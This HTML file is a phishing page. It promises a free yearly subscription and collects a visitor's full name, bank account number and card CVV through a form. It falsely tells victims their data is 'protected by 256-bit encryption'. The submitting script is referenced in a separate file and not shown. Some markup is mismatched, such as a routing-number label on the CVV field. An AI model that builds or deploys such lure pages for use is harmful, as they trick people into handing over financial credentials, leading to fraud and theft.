<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Banking Details</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1 class="title">AVAIL YEARLY SUBSCRIPTION FOR FREE!!!</h1>
        <h1 class="title">Enter Your Banking Details</h1>
        <form id="bank-form">
            <div class="field">
                <label for="name">Full Name:</label>
                <input type="text" id="name" name="name" placeholder="Your Full Name" required>
            </div>
            <div class="field">
                <label for="account-number">Account Number:</label>
                <input type="number" id="account-number" name="account-number" placeholder="16-digit Account Number" minlength="10" maxlength="16" required>
            </div>
            <div class="field">
                <label for="routing-number">CVV:</label>
                <input type="number" id="cvv-number" name="cvv-number" placeholder="3-digit CVV" minlength="3" maxlength="3" required>
            </div>
            <button type="submit">Submit Details</button>
        </form>
        <p class="privacy">Your information is protected by 256-bit encryption.</p>
    </div>

    <script src="script.js"></script>
</body>
</html>
